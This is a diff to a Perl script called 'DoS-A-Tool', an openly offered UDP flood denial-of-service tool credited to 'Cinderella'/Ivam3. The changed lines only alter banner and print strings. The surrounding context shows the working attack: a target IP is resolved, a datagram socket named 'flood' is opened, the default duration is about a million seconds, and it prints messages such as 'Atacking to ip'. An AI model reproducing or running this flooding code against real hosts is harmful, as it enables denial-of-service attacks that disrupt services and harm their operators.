@@ -40,7 +40,7 @@ Cinderella : This script was coded by . .
                       \/    \/      \/
 	====== By ___ Cinderella ======
 
-Cinderella : To use it just execute $sh DoS-A-Tool
+Cinderella : Something was wrong try again running >> $sh DoS-A-Tool
 
 https://www.youtube.com/c/ivam3bycinderella
 
@@ -64,8 +64,8 @@ $iaddr = inet_aton("$ip") or die "[w] CINDERELLA : Cannot resolve hostname $ip\n
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
-print "Atacking to ip: $ip " . ($port ? $port : "By:") . " Ivam3 " . 
-  ($size ? "$size-byte" : "DoS-A-Tool is Oficial of : Ivam3") . " www.youtube.com/c/ivam3bycinderella" . ($time ? " for $time seconds" : "") . "\n";
+print "Atacking to ip: $ip " . ($port ? $port : "By:") . " Ivam3 >>" . 
+  ($size ? "$size-byte" : "DoS-A-Tool is Oficial of : Ivam3 >>") . " www.youtube.com/c/ivam3bycinderella" . ($time ? " for $time seconds" : "") . "\n";
 print "[+] CINDERELLA : Interpacket delay $delay msec\n" if $delay;
 print "[+] CINDERELLA Total IP bandwidth $bw kbps\n" if $bw;
 print "[-] CINDERELLA : To shut down the attack press Ctrl+C\n" unless $time;
